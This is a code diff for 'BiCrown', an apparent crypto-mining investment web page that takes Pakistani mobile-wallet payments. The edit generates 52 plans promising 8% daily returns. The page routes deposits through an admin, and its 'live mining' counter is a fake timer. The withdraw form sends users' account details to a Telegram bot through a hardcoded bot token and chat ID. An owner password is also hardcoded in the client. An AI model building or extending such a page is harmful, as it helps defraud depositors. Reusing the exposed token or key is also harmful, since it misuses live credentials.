@@ -3,27 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BiCrown | The King of Mining</title>
+    <title>BiCrown | Elite Mining Network</title>
     <style>
         :root { --neon-purple: #bc13fe; --dark-bg: #050505; --card-bg: #121212; --text-gray: #777; --success: #00ff88; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--dark-bg); color: white; margin: 0; display: flex; overflow-x: hidden; }
         
+        /* Sidebar Styles */
         .sidebar { width: 260px; background: #000; height: 100vh; border-right: 1px solid #1a1a1a; position: fixed; padding: 20px; z-index: 100; }
         .sidebar h1 { color: var(--neon-purple); text-shadow: 0 0 15px var(--neon-purple); letter-spacing: 2px; }
         .nav-item { padding: 14px; color: var(--text-gray); cursor: pointer; border-radius: 10px; margin-bottom: 8px; transition: 0.3s; display: flex; align-items: center; }
         .nav-item:hover { background: #1a1a1a; color: white; transform: translateX(5px); }
 
+        /* Main Content */
         .main { margin-left: 300px; padding: 30px; width: calc(100% - 300px); transition: 0.3s; }
         .card { background: var(--card-bg); padding: 25px; border-radius: 18px; border: 1px solid #222; margin-bottom: 25px; }
         
-        .plan-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
-        .plan-card { background: #181818; padding: 25px; border-radius: 20px; border: 1px solid #333; text-align: center; transition: 0.4s; }
-        .plan-card:hover { border-color: var(--neon-purple); transform: translateY(-10px); }
-        .plan-price { font-size: 28px; font-weight: bold; color: white; margin: 15px 0; }
+        /* Plans Grid */
+        .plan-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
+        .plan-card { background: #181818; padding: 20px; border-radius: 20px; border: 1px solid #333; text-align: center; transition: 0.4s; position: relative; overflow: hidden; }
+        .plan-card:hover { border-color: var(--neon-purple); transform: translateY(-5px); box-shadow: 0 5px 15px rgba(188, 19, 254, 0.2); }
+        .plan-badge { background: var(--neon-purple); font-size: 10px; padding: 3px 10px; border-radius: 10px; position: absolute; top: 10px; right: 10px; }
         
-        .action-btn { background: linear-gradient(45deg, var(--neon-purple), #5a12fa); border: none; color: white; padding: 12px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        .plan-price { font-size: 24px; font-weight: bold; color: white; margin: 10px 0; }
+        .profit-text { color: var(--success); font-size: 14px; font-weight: 500; }
+        
+        .action-btn { background: linear-gradient(45deg, var(--neon-purple), #5a12fa); border: none; color: white; padding: 12px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; margin-top: 15px; }
         input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: white; }
-        
+
         @media (max-width: 768px) {
             .sidebar { width: 60px; padding: 10px; overflow: hidden; }
             .sidebar h1 { display: none; }
@@ -61,25 +67,16 @@
         </div>
 
         <div id="plans-page" style="display:none;">
-            <h2 style="margin-bottom:20px;">Mining Packages</h2>
-            <div class="plan-grid">
-                <div class="plan-card"><span>STARTER</span><div class="plan-price">Rs 350</div><p>Daily Rs 25</p><button class="action-btn" onclick="alert('Please Deposit first')">Buy Now</button></div>
-                <div class="plan-card" style="border: 1px solid var(--neon-purple);"><span>PREMIUM</span><div class="plan-price">Rs 5000</div><p>Daily Rs 450</p><button class="action-btn" onclick="alert('Please Deposit first')">Buy Now</button></div>
-                <div class="plan-card" style="border: 2px solid gold; background: linear-gradient(145deg, #1a1a1a, #2a2a00);">
-                    <span style="color:gold; font-weight:bold;">👑 ELITE SHAH</span>
-                    <div class="plan-price">Rs 100,000</div>
-                    <p>Daily: Rs 8,500</p>
-                    <button class="action-btn" style="background:gold; color:black;" onclick="alert('Contact Admin for Elite')">Buy Elite</button>
+            <h2 style="margin-bottom:20px;">Mining Packages (50+ Available)</h2>
+            <div class="plan-grid" id="plan-container">
                 </div>
-            </div>
         </div>
 
         <div id="dep-page" style="display:none;" class="card">
             <h2>Withdraw Funds</h2>
-            <p style="color:var(--text-gray);">Enter your JazzCash/Easypaisa details</p>
-            <input type="text" id="acc-num" placeholder="Account Number (e.g 0300xxx)">
+            <input type="text" id="acc-num" placeholder="JazzCash/Easypaisa Number">
             <input type="number" id="withdraw-amount" placeholder="Amount in Rs">
-            <button class="action-btn" id="send-btn">Request Withdraw</button>
+            <button class="action-btn" id="send-btn">Submit Request</button>
         </div>
 
         <div id="ref-page" style="display:none;" class="card">
@@ -89,26 +86,41 @@
         </div>
 
         <div id="admin-panel" style="display:none;" class="card">
-            <h2 style="color:red">OWNER CONTROL Panel</h2>
-            <div id="admin-logs">> System Online... Bot Connected.</div>
+            <h2 style="color:red">OWNER Panel</h2>
+            <div id="admin-logs">> All systems green. Bot active.</div>
         </div>
     </div>
 
     <script>
-        // Pages switch karne ke liye
+        // Pages switch logic
         function showPage(p) {
-            document.getElementById('dash-page').style.display = (p=='dash')?'block':'none';
-            document.getElementById('plans-page').style.display = (p=='plans')?'block':'none';
-            document.getElementById('ref-page').style.display = (p=='ref')?'block':'none';
-            document.getElementById('dep-page').style.display = (p=='dep')?'block':'none';
-            document.getElementById('admin-panel').style.display = 'none';
+            ['dash-page', 'plans-page', 'ref-page', 'dep-page', 'admin-panel'].forEach(id => {
+                document.getElementById(id).style.display = 'none';
+            });
+            document.getElementById(p + '-page') ? document.getElementById(p + '-page').style.display = 'block' : null;
+            if(p === 'dep') document.getElementById('dep-page').style.display = 'block';
         }
 
-        // Admin access
-        function openAdmin() {
-            if(prompt("Enter Owner Key:") === "romi742327") {
-                document.getElementById('admin-panel').style.display = 'block';
-            }
+        // --- 50+ PLANS GENERATOR ---
+        const container = document.getElementById('plan-container');
+        let startPrice = 350;
+        
+        for (let i = 1; i <= 52; i++) {
+            let daily = Math.floor(startPrice * 0.08); // 8% Daily Profit
+            let total = daily * 30; // 30 Days Cycle
+            
+            const planHTML = `
+                <div class="plan-card">
+                    <div class="plan-badge">LEVEL ${i}</div>
+                    <span style="color:var(--text-gray)">MINER v${i}.0</span>
+                    <div class="plan-price">Rs ${startPrice.toLocaleString()}</div>
+                    <p class="profit-text">Daily: Rs ${daily}</p>
+                    <p style="font-size:12px; color:var(--text-gray)">Monthly: Rs ${total}</p>
+                    <button class="action-btn" onclick="alert('Please contact admin to deposit Rs ${startPrice}')">Activate Miner</button>
+                </div>
+            `;
+            container.innerHTML += planHTML;
+            startPrice += 500; // Har plan 500 mehnga
         }
 
         // Live Mining Effect
@@ -118,28 +130,23 @@
             document.getElementById('mining-live').innerText = "$" + liveAmt.toFixed(5);
         }, 1500);
 
-        // --- TELEGRAM NOTIFICATION SYSTEM ---
+        // Telegram Logic
         const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
         const chatId = "7005219148";
 
         document.getElementById('send-btn').addEventListener('click', function() {
             const acc = document.getElementById('acc-num').value;
             const amt = document.getElementById('withdraw-amount').value;
-
             if(acc && amt) {
-                const message = `👑 *BiCrown - New Withdraw* 👑%0A%0A💰 *Amount:* Rs ${amt}%0A💳 *Account:* ${acc}%0A👤 *Status:* Pending`;
-                
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
-                .then(res => {
-                    alert("Mubarak ho! Request Admin ko bhej di gayi hai.");
-                    document.getElementById('acc-num').value = "";
-                    document.getElementById('withdraw-amount').value = "";
-                })
-                .catch(err => alert("Net ka masla hai jani!"));
-            } else {
-                alert("Pehle details to bharo!");
+                const msg = `👑 *BiCrown Request*%0A💰 Amount: Rs ${amt}%0A💳 Account: ${acc}`;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=Markdown`)
+                .then(() => { alert("Sent!"); });
             }
         });
+
+        function openAdmin() {
+            if(prompt("Key:") === "romi742327") document.getElementById('admin-panel').style.display = 'block';
+        }
     </script>
 </body>
 </html>
